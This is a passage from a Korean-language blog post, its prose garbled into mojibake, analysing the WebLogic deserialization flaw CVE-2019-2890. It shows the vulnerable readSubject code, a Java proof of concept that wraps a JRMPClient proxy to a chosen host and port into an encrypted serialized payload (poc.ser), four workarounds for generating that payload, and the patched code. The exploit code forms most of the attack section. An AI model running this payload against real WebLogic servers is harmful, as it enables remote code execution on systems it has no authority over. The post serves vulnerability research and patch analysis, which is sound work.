ì•”í˜¸í™”í•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. ì—¬ê¸°ì„œ ì§ë ¬í™”í•  ë•Œ ë°ì´í„°ì˜ ëŒ€í•œ ê²€ì¦ ë¡œì§ë§Œ ìˆì—ˆìœ¼ë©´ í•´ë‹¹ ì·¨ì•½ì ì€ í„°ì§€ì§€ ì•Šì•˜ì„ ê±´ë°, ê²€ì¦ ë¡œì§ì´ ì—†ì–´ ì·¨ì•½ì ê¹Œì§€ ì—°ê³„ê°€ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ writeSubject ë©”ì†Œë“œì—ì„œ ë§Œë“¤ì–´ì§„ ì§ë ¬í™” ë°ì´í„°ëŠ” ì•„ê¹Œ ë§í•œ T3 í”„ë¡œí† ì½œì„ ì´ìš©í•´ì„œ ì›¹ ë¡œì§ ì„œë²„ë¡œ ì „ì†¡ì„ í•˜ê²Œ ë©ë‹ˆë‹¤.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundExeception </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().lock();</span><br><span class="line">        <span class="keyword">this</span>._propertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._propBagClassNames = (Set)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._contextPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._invocationPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._state = (PersistentContext.State)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>.readsubject(var1);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì§ë ¬í™” ë°ì´í„°ë¥¼ T3 í”„ë¡œí† ì½œë¡œ ì „ì†¡í•˜ë©´ <code>readObject</code> ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ ë°›ì•„ <code>readSubject</code> ë©”ì„œë“œë¡œ ë„˜ê²¨ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var2 = var1.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[var2];</span><br><span class="line">        var1.readFully(var3);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            var3 = EncryptionUtil.decrypt(var3);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream var4 = <span class="keyword">new</span> ByteArrayInputStream(var3);</span><br><span class="line">        ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)var5.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì§ë ¬í™” ë°ì´í„°ëŠ” <code>readObject</code> ë©”ì„œë“œì—ì„œ <code>readSubject</code> ë©”ì„œë“œë¡œ ì „ë‹¬í•´ ì¤˜ ë°›ê²Œ ë©ë‹ˆë‹¤. <code>Line 3 ~ 8</code>ì—ì„œ ë°ì´í„°ë¥¼ ì½ê³ , ë³µí˜¸í™”ë¥¼ í•˜ê³ , <code>Line 10 ~ 12</code>ì—ì„œ ì—­ì§ë ¬í™”ë¥¼ í•˜ëŠ”ë° ë°”ë¡œ ì´ë•Œ RCEê°€ í„°ì§‘ë‹ˆë‹¤.<br></p><p>ì´ë¡œì„œ ìš°ë¦¬ëŠ” <code>PersistentContext</code> í´ë˜ìŠ¤ì—ì„œëŠ” ì§ë ¬í™”í•œ ë°ì´í„°ë¥¼ ì•”í˜¸í™”í•˜ê³ , ì „ì†¡í•œë‹¤ëŠ” ê²ƒì„ ì•Œê³  ìˆìŠµë‹ˆë‹¤. ê·¸ë ‡ê¸° ë•Œë¬¸ ìµìŠ¤í”Œë¡œì‡ì„ í•˜ë ¤ë©´ ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ POCë¥¼ ì‘ì„±í•´ì„œ ì§ë ¬í™” ë°ì´í„°ë¥¼ ë§Œë“¤ì–´ì£¼ì–´ì•¼ í•©ë‹ˆë‹¤. </p><hr><h2 id="CVE-2019-2890-POC"><a href="#CVE-2019-2890-POC" class="headerlink" title=" CVE-2019-2890 POC"></a><span style="color:#21C587"></span> CVE-2019-2890 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.wsee.jaxws.persistence;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.kernel.KernelStatus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span>  </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sep = command.indexOf(<span class="number">58</span>);</span><br><span class="line">            String host;</span><br><span class="line">            <span class="keyword">int</span> port;</span><br><span class="line">            <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                port = (<span class="keyword">new</span> Random()).nextInt(<span class="number">65535</span>);</span><br><span class="line">                host = command;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">                port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ObjID id = <span class="keyword">new</span> ObjID((<span class="keyword">new</span> Random()).nextInt());</span><br><span class="line">            TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">            UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">            RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">            Registry proxy = (Registry)Proxy.newProxyInstance(ysoserial.payloads.JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">            <span class="keyword">return</span> proxy;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">            PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            objectOutputStream.writeObject(pc);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ìœ„ java codeê°€ main poc ì½”ë“œì…ë‹ˆë‹¤. ìœ„ poc í´ë˜ìŠ¤ë¥¼ ì´ìš©í•´ ì§ë ¬í™” ë°ì´í„°ë¥¼ ë§Œë“¤ì–´ì•¼ í•©ë‹ˆë‹¤.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (SubjectManager.getSubjectManager().isKernelIdentity(this._subject)) &#123;</span></span><br><span class="line"><span class="comment">//        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span></span><br><span class="line"><span class="comment">//        getSubjectManager().getAnonymousSubject();</span></span><br><span class="line"><span class="comment">//        var3.writeObject(var4);</span></span><br><span class="line"><span class="comment">//    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//        var3.writeObject(this._subject);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">[+] var3.writeObject(Poc.getObject());</span><br><span class="line"></span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (KernelStatus.isServer()) &#123;</span></span><br><span class="line"><span class="comment">//        var5 = EncryptionUtil.encrypt(var5);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìœ„ì™€ ê°™ì´ writeSubject ë©”ì„œë“œì—ì„œ <code>Poc.getObject</code>ë¥¼ ì¶”ê°€í•˜ë©´ ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ ì¼ë‹¨ ì§ë ¬í™” ë°ì´í„°ë¥¼ ë§Œë“¤ê¸° ì „ì—ëŠ” 4ê°€ì§€ ë¬¸ì œì ì´ ìƒê¸°ëŠ”ë° ì´ë¥¼ ëª¨ë‘ í•´ê²°í•´ì¤˜ì•¼ í•©ë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.bea.core.security.managers.NotSupportedException</span><br><span class="line">    at weblogic.security.service.SecurityServiceManager.isKernelIdentity(SecurityServiceManager.java:546)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.PersistenContext.&lt;init&gt;(PersistentContext.java:168)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.Poc2.main(Poc2.java:27)</span><br></pre></td></tr></table></figure><ol><li>ì²« ë²ˆì§¸ ì˜¤ë¥˜ëŠ” PersistenContext ê°ì²´ë¥¼ ë§Œë“¤ ë•Œ ë°œìƒí•©ë‹ˆë‹¤. ì´ ì—ëŸ¬ëŠ” PersistenContextë¥¼ ì´ˆê¸°í™” ì¤‘ì— í˜¸ì¶œ í•˜ëŠ”ë° <code>SecurityServiceManager.isKernelIdentity</code> ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ ì»¤ë„ IDë¥¼ ì²´í¬í•˜ëŠ”ë° ì´ë•Œ ì—ëŸ¬ë¥¼ ë‚´ë±‰ê³  ì§ë ¬í™”ë¥¼ ì¢…ë£Œí•˜ê²Œ ë©ë‹ˆë‹¤.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> bollean <span class="title">isKernelIdentity</span><span class="params">(AuthenticatedSubject var0)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isKernelIdentity</code> ë©”ì„œë“œì—ì„œ <code>NotSupportedException</code> ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PersistenContext(<span class="meta">@NotNull</span> String var1, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var2, <span class="meta">@NotNull</span> Set&lt;String&gt; var3, <span class="meta">@Nullable</span> Map&lt;String, Serializable&gt; var4, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var5) &#123;</span><br><span class="line">    <span class="keyword">super</span>(var1);</span><br><span class="line">    <span class="keyword">this</span>._propertyMap = var2;</span><br><span class="line">    <span class="keyword">this</span>._proBagClassNames = var3;</span><br><span class="line">    <span class="keyword">this</span>._contextPropertyMap = var4;</span><br><span class="line">    <span class="keyword">this</span>._invocationPropertyMap = var5;</span><br><span class="line">    <span class="keyword">this</span>._state = PersistentContext.State.UNUSED;</span><br><span class="line">   AuthenticatedSubject var6 = getCurrentSubject();</span><br><span class="line"><span class="comment">//      if (SecurityServiceManager.isKernelIdentity(var(6)) &#123;</span></span><br><span class="line"><span class="comment">//          throw new IllegalStateException(&quot;Attempt to create PersistentContext using kernel identity. All actions that can create PersistentContext must run as a user principal&quot;);</span></span><br><span class="line"><span class="comment">//      &#125; else &#123;</span></span><br><span class="line"><span class="comment">//          this._subject = var6;</span></span><br><span class="line"><span class="comment">//          this._initTransients();</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">    <span class="keyword">this</span>._subject = var6;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì²« ë²ˆì¬ ë¬¸ì œëŠ” ìœ„ì™€ ê°™ì´ <code>PersistenContext</code>ì—ì„œ <code>isKernelIdentity</code> ë©”ì„œë“œë¥¼ ì´ìš©í•œ ì¡°ê±´ë¬¸ì„ ëª¨ë‘ ì£¼ì„ ì²˜ë¦¬í•¨ìœ¼ë¡œ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><ol start="2"><li>ë‘ ë²ˆì§¸ ë¬¸ì œëŠ” <code>deserialization PersistenContext</code> í´ë˜ìŠ¤ê°€ ì¤‘ë‹¨ë˜ëŠ” ê²ƒ ì…ë‹ˆë‹¤. </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersistentContext</span> <span class="keyword">extends</span> <span class="title">AbstractStorable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AuthenticatedSubject KERNEL_ID = (AuthenticatedSubject)AccessController.doPrivileged(PrivilgedActions.getKernelIdentityAction());</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ReentranReadWriteLock _lock;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Serializable&gt; _propertyMap;</span><br><span class="line">    </span><br><span class="line">    (ìƒëµ)</span><br></pre></td></tr></table></figure><p><code>PersistentContext</code> í´ë˜ìŠ¤ë¥¼ ë³´ë©´ <code>AuthenticatedSubject</code>ë¥¼ ì´ˆê¸°í™”í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SubjectManager <span class="title">getSubjectManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var0 = ceSubjectManagerLock; var0 (slot_0): Object@<span class="number">661</span></span><br><span class="line">    <span class="keyword">synchronized</span>(ceSubjectManagerLock) &#123;</span><br><span class="line">        <span class="keyword">while</span>(ceSubjectManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ceClient) &#123;</span><br><span class="line">                ceSubjectManager = SubjectManagerFactory.getInstance().getSubjectManager();</span><br><span class="line">                <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">             &#125;</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 ceSubjectManagerLock.wait();</span><br><span class="line">             &#125; <span class="keyword">catch</span> (InterruptedException var3) &#123;</span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var3);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AuthenticatedSubject</code>ë¥¼ ì´ˆê¸°í™” í•  ë•ŒëŠ” ìœ„ ì½”ë“œê°€ ì‹¤í–‰ë˜ëŠ”ë° <code>ceClient</code>ì˜ ê°’ì´ <code>True</code>ê°€ ì•„ë‹ˆë¼ë©´ ë¬´í•œ ë£¨í”„ì— ë¹ ì§€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>ceSubjectManagerLock.wait</code> ë©”ì„œë“œì—ì„œëŠ” ì§ë ¬í™”ê°€ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  <code>ceClient</code>ëŠ” ì‹œìŠ¤í…œ ì†ì„±ì´ê¸° ë•Œë¬¸ì— <code>com.bea.core.internal.client</code>ì„ ì´ìš©í•´ì„œ <code>True</code>ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final bollean ceClient &#x3D; &quot;true&quot;.equalsIgnoreCase(System.getProperty( key:&quot;com.bea.core.internal.client&quot;, def:&quot;false&quot;));</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ ìœ„ì™€ ê°™ì´ <code>ceClient</code> ë³€ìˆ˜ë¥¼ ì„¤ì •í•´ì£¼ë©´ ë¬´í•œë£¨í”„ì— ë¹ ì§€ì§€ ì•Šì•„ ë‘ ë²ˆì§¸ ë¬¸ì œë„ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><ol start="3"><li>ì„¸ ë²ˆì§¸ ë¬¸ì œëŠ” ì§ë ¬í™” ë°ì´í„°ê°€ ì•”í˜¸í™”ë˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê²ƒ ì…ë‹ˆë‹¤.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] var0) &#123;</span><br><span class="line">    <span class="keyword">return</span> Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EncryptionUtilencrypt</code>ë¥¼ í™•ì¸í•´ë³´ë©´ <code>isServer</code> ë©”ì„œë“œ ê°’ì´ ì°¸ì´ë©´ ì•”í˜¸í™”í•œ ê°’ì„ ë„£ì–´ì£¼ê³ , ì°¸ì´ ì•„ë‹ˆë©´ ì•”í˜¸í™”í•˜ì§€ ì•Šê³  ì›ë³¸ì„ ë°˜í™˜í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KernelStatus.setIsServer(true)</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ ì§ë ¬í™” ë°ì´í„°ë¥¼ ì•”í˜¸í™”í•˜ê¸° ì „ì— ìœ„ êµ¬ë¬¸ì„ ì •ì˜í•´ì¤Œìœ¼ë¡œì„œ <code>isServer</code> ê°’ì´ ì°¸ì´ ë˜ê²Œ ë§Œë“¤ë©´ ì§ë ¬í™” ë°ì´í„°ê°€ ì˜ ì•”í˜¸íšŒë˜ì–´ ì„¸ ë²ˆì§¸ ë¬¸ì œë„ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><ol start="4"><li>ë„¤ ë²ˆì§¸ ë¬¸ì œëŠ” ì•”í˜¸í™”ì— ì‚¬ìš©ë˜ëŠ” <code>SerializedSystemIni.dat</code> íŒŒì¼ì´ ì—†ë‹¤ëŠ” ê²ë‹ˆë‹¤. í•´ë‹¹ ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ì„œëŠ” í˜„ì¬ ì›¹ ë¡œì§ì—ì„œ ì‚¬ìš©ë˜ê³  ìˆëŠ” <code>SerializedSystemIni.dat</code> íŒŒì¼ì„ poc ë””ë ‰í„°ë¦¬ì— ë„£ì–´ì£¼ë©´ ë©ë‹ˆë‹¤.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">    PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    objectOutputStream.writeObject(pc);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4ê°€ì§€ì˜ ë¬¸ì œë¥¼ ëª¨ë‘ í•´ê²°í•˜ì˜€ìœ¼ë©´ <code>poc.ser</code> íŒŒì¼ì„ ìƒì„±í•˜ê³ , í•´ë‹¹ íŒŒì¼ë¡œ ìµìŠ¤ë¥¼ ì§„í–‰í•˜ë©´ RCEë¥¼ íŠ¸ë¦¬ê±° í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><hr><h2 id="CVE-2019-2890-Patch"><a href="#CVE-2019-2890-Patch" class="headerlink" title=" CVE-2019-2890 Patch"></a><span style="color:#21C587"></span> CVE-2019-2890 Patch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream in)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = in.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        in.readFully(bytes);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            bytes = EncryptionUtil.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in2 = <span class="keyword">new</span> PersistentContext.WSFilteringObjectInputStream(bais);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)in2.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>íŒ¨ì¹˜ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´ <code>readSubject</code> 